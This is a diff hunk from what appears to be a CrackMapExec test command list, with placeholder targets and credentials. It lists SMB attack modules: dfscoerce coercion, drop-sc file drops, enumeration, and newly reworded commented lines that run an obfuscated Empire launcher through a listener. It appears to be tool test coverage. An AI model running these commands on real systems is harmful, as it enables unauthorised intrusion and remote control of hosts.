@@ -28,7 +28,8 @@ crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M dfscoerce
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M drop-sc
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M drop-sc --options
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M drop-sc -o CLEANUP=True
-# crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M empire_exec
+#crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M empire_exec -o LISTENER=http-listener
+#crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M empire_exec -o LISTENER=http-listener OBFUSCATE=True
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M enum_av
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M enum_dns
 crackmapexec smb TARGET -u USERNAME -p PASSWORD KERBEROS -M enum_dns --options
